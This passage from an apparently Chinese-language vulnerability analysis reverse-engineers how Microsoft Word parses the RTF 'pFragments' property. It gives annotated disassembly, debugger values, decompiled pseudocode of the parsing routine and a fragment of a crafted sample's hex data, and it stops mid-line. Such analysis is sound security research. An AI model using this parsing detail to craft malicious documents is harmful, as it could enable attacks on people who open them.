   <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1B                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   esi = [ebp+0x8] = [0x0011B1C0] = 0x05D755CC(a1)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1E                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1F                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_8]         <span class="comment">;   edi = [ebp+0x10] = [0x0011B1B8+0x10] = [0x0011B1C8] = 0x00000004(a3)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E22                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   eax = ebp+0x8 = 0x0011B1C0(a1地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E25                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg3: eax = 0x0011B1C0(a1地址) </span></span><br><span class="line"><span class="symbol">            .text:</span>32608E26                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]    <span class="comment">;   eax = [esi+8] = [0x05D755CC+8] = [0x05D755D4] = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2A                 <span class="keyword">push</span>    <span class="built_in">edi</span>                      <span class="comment">; arg2: edi = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2B                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E2C                 <span class="keyword">call</span>    sub_32608E81</span><br><span class="line"><span class="symbol">            .text:</span>32608E31                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x00000001</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E33                 <span class="keyword">jz</span>      loc_32BD823F             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E39                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]         <span class="comment">;   eax = [ebp+0xc] = [0x0011B1C4] = 0x00000004(a2)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E3C                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]    <span class="comment">;   ecx = [esi+8] = [0x05D755CC+8] = [0x05D755D4] = 0x00000006 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E40                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="number">7FFFh</span>               <span class="comment">;   eax = eax&amp;0x7FFF = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E45                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                 <span class="comment">;   eax = eax&lt;&lt;0x10 = 0x00040000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E48                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span>                 <span class="comment">;   eax = eax or ecx = 0x00040006</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4A                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+arg_C]         <span class="comment">;   ecx = [ebp+0x14] = [0x0011B1CC] = 0x00000000(a4)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4D                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span>                 <span class="comment">;   edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E4F                 <span class="keyword">cmp</span>     <span class="built_in">edi</span>, <span class="built_in">edx</span>                 <span class="comment">;   edi = 0x00000004</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E51                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">8</span>], <span class="built_in">eax</span>             <span class="comment">;   [esi+8] = [0x05D755CC+8] = [0x05D755D4] = eax = 0x00040006  &lt;---- 关键对象的第4个dword重新赋值</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E54                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">0Ch</span>]           <span class="comment">;   eax = esi+0xc = 0x05D755CC+0xc = 0x05D755D8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E57                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>], <span class="built_in">edx</span>               <span class="comment">;   [esi] = [0x05D755CC] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E59                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">4</span>], <span class="built_in">edx</span>             <span class="comment">;   [esi+4] = [0x05D755D0] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E5C                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">edx</span>               <span class="comment">;   [eax] = [0x05D755D8] = edx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E5E                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">10h</span>], <span class="built_in">ecx</span>           <span class="comment">;   [esi+0x10] = [0x05D755CC+0x10] = [0x05D755DC] = ecx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E61                 <span class="keyword">jbe</span>     short loc_32608E78       <span class="comment">;   不大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E63                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x00000000</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E64                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">;   eax = 0x05D755D8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E65                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">;   [ebp+8] = [0x0011B1B8+8] = [0x0011B1C0] = 0x18</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E68                 <span class="keyword">call</span>    MSO_234                  <span class="comment">; </span></span><br><span class="line"><span class="symbol">            .text:</span>32608E6D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E6F                 <span class="keyword">jl</span>      loc_32BD823F </span><br><span class="line"><span class="symbol">            .text:</span>32608E75                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">4</span>], <span class="built_in">edi</span>             <span class="comment">;   [0x05D755CC+4] = [0x05D755D0] = 0x4</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E78</span><br><span class="line"><span class="symbol">            .text:</span>32608E78 loc_32608E78:                        </span><br><span class="line"><span class="symbol">            .text:</span>32608E78                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7A                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                      <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7B</span><br><span class="line"><span class="symbol">            .text:</span>32608E7B loc_32608E7B:                          </span><br><span class="line"><span class="symbol">            .text:</span>32608E7B                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                      <span class="comment">;   edi = 0x6</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7C                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                      <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7D                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E7E                 <span class="keyword">retn</span>    <span class="number">10h</span></span><br><span class="line">                |       |</span><br><span class="line">                ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>326098C8                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C9                 <span class="keyword">retn</span>    <span class="number">0Ch</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>326CCBCA                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBCC                 <span class="keyword">jz</span>      loc_32C9663A                 <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD2                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]             <span class="comment">;   eax = [ebp+0xc] = [0x0011B1F4] = 0x0011B260(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD5                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">esi</span>                   <span class="comment">;   [eax] = [0x0011B260] = esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD7                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBD9                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA</span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA loc_326CCBDA:                         </span><br><span class="line"><span class="symbol">    .text:</span>326CCBDA                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0004;(ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDB                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBDC                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过仔细分析，我们可以发现，对<code>“pFragments”</code>属性数据的<code>处理逻辑</code>，都在<code>wwlib.dll</code>的<code>sub_31FD724E</code>函数中，但是分析了这么久，只找到了<code>“6;5;”</code>中的<code>“6”</code>和<code>“5”</code>，也就是<code>数组元素的大小</code>和<code>数组元素个数</code>都使用<code>10进制</code>表示的，未做其他判断。从前面rtf的文档中关于<code>“pFragments”</code>属性的介绍可以知道，<code>数组元素的大小</code>可以为<code>2、4或8</code>，这个并没有找到。我们通过IDA的<code>F5反编译</code>功能，查看<code>sub_31FD724E</code>的伪代码，或许会发现点什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_31FD724E</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    _BYTE *temp_ptr; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">int</span> el_size_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> el_size; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">int</span> el_count_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> byte_num; <span class="comment">// eax</span></span><br><span class="line">    HGLOBAL mem_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> index; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">char</span> *mem_lock_ptr; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 chr_hex; <span class="comment">// cl</span></span><br><span class="line">    <span class="keyword">char</span> chr; <span class="comment">// cl</span></span><br><span class="line">    <span class="keyword">char</span> new_char; <span class="comment">// al</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 chr_hex1; <span class="comment">// cl</span></span><br><span class="line">    _BYTE *group_part_ptr2; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *group_part_ptr; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">char</span> current_char; <span class="comment">// al</span></span><br><span class="line">    <span class="keyword">int</span> count1; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *array_element_ptr1; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// edi</span></span><br><span class="line">    _BYTE *array_element_ptr; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> case_num; <span class="comment">// [esp+Ch] [ebp-64h]</span></span><br><span class="line">    <span class="keyword">int</span> group_part_value1; <span class="comment">// [esp+38h] [ebp-38h]</span></span><br><span class="line">    <span class="keyword">int</span> group_part_value2; <span class="comment">// [esp+3Ch] [ebp-34h]</span></span><br><span class="line">    <span class="keyword">int</span> array_element_value; <span class="comment">// [esp+40h] [ebp-30h]</span></span><br><span class="line">    <span class="keyword">int</span> array_element_value1; <span class="comment">// [esp+44h] [ebp-2Ch]</span></span><br><span class="line">    <span class="keyword">int</span> Src; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">    LPCVOID pMem; <span class="comment">// [esp+54h] [ebp-1Ch]</span></span><br><span class="line">    _BYTE *group_part_ptr1; <span class="comment">// [esp+60h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> *count2; <span class="comment">// [esp+64h] [ebp-Ch]</span></span><br><span class="line">    <span class="keyword">int</span> *key_object; <span class="comment">// [esp+68h] [ebp-8h]</span></span><br><span class="line">    LPSTREAM el_count; <span class="comment">// [esp+6Ch] [ebp-4h]</span></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span>, <span class="keyword">int</span> *))(v44 + <span class="number">344</span>))(v42, v43, &amp;case_num); <span class="comment">// sub_329202C7,result = 1</span></span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    result = case_num; <span class="comment">//case_num = 6</span></span><br><span class="line">    <span class="keyword">switch</span> ( case_num )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            temp_ptr = (_BYTE *)*((_DWORD *)v39 + <span class="number">0x1D9D</span>);</span><br><span class="line">            el_size_ptr = *((_DWORD *)v39 + <span class="number">0x1D9D</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 6;5;11111111</span></span><br><span class="line">    <span class="keyword">while</span> ( *temp_ptr != <span class="string">';'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !*++temp_ptr )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    &#125;</span><br><span class="line">    *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    el_size = sub_31BAF3C6(el_size_ptr); <span class="comment">//判断pFragments的属性数组参数是否合法，合法则由字符转为整型,el_size = 6</span></span><br><span class="line">    el_count_ptr = (<span class="keyword">int</span>)temp_ptr;</span><br><span class="line">    <span class="keyword">while</span> ( *temp_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++temp_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    el_count = (LPSTREAM)sub_31BAF3C6(el_count_ptr); <span class="comment">//判断pFragments的属性数组参数是否合法，合法则由字符转为整型,el_count = 5</span></span><br><span class="line">    <span class="comment">// 如果el_size为0,MSO_379-&gt;MSO_501-&gt;sub_32608E17-&gt;sub_32608E81中的"32608EAE div ecx"会出错</span></span><br><span class="line">    <span class="comment">// el_size被当做"div ecx"中的除数(ecx)</span></span><br><span class="line">    result = MSO_379(el_size, &amp;key_object);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// el_size如果为2,4,8会进行额外处理，非2,4,8则不会处理</span></span><br><span class="line">    <span class="keyword">switch</span> ( el_size )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                array_element_ptr = temp_ptr;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">                    <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++temp_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">        LABEL_88:</span><br><span class="line">                array_element_value = (<span class="keyword">unsigned</span> __int16)sub_32046D00(array_element_ptr); <span class="comment">// 10进制字符串转化为10进制整型值</span></span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*key_object + <span class="number">12</span>))(key_object, &amp;array_element_value, count) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                <span class="keyword">if</span> ( ++count &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            count1 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                array_element_ptr1 = temp_ptr;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_79;</span><br><span class="line">                    <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++temp_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">        LABEL_79:</span><br><span class="line">                array_element_value1 = sub_32046D00(array_element_ptr1);</span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*key_object + <span class="number">12</span>))(key_object, &amp;array_element_value1, count1) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                <span class="keyword">if</span> ( ++count1 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:             <span class="comment">// 当el_size为8时，为一组两个数字，如：(0,100)</span></span><br><span class="line">            group_part_ptr2 = <span class="number">0</span>;</span><br><span class="line">            group_part_ptr1 = <span class="number">0</span>;</span><br><span class="line">            count2 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            <span class="keyword">while</span> ( !*temp_ptr )</span><br><span class="line">            &#123;</span><br><span class="line">            LABEL_72:</span><br><span class="line">                group_part_value1 = sub_32046D00(group_part_ptr1);</span><br><span class="line">                group_part_value2 = sub_32046D00(group_part_ptr2);</span><br><span class="line">                <span class="keyword">if</span> ( !(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span> *))(*key_object + <span class="number">12</span>))(key_object, &amp;group_part_value1, count2) )</span><br><span class="line">                    <span class="keyword">return</span> (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span> *))(*key_object + <span class="number">4</span>))(key_object);</span><br><span class="line">                count2 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)count2 + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)el_count )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">            &#125;</span><br><span class="line">            group_part_ptr = temp_ptr + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                current_char = *temp_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( *temp_ptr == <span class="string">';'</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    *temp_ptr++ = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_72;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( current_char == <span class="string">'('</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    group_part_ptr1 = group_part_ptr;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( current_char == <span class="string">','</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        group_part_ptr2 = group_part_ptr;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ( current_char != <span class="string">')'</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_71;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *temp_ptr = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        LABEL_71:</span><br><span class="line">                ++temp_ptr;</span><br><span class="line">                ++group_part_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( !*temp_ptr )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_72;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    byte_num = MSO_294(temp_ptr);                 <span class="comment">// 计算pFragments属性值字节数，"11111111acc8....feff61&#125;&#125;&#125;"不算括号</span></span><br><span class="line">    count2 = (<span class="keyword">int</span> *)byte_num;</span><br><span class="line">    mem_ptr = GlobalAlloc(<span class="number">0x40</span>u, (byte_num + <span class="number">1</span>) / <span class="number">2</span>); <span class="comment">// 分配内存</span></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    mem_lock_ptr = (<span class="keyword">char</span> *)GlobalLock(mem_ptr);</span><br><span class="line">    pMem = mem_lock_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)count2 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span 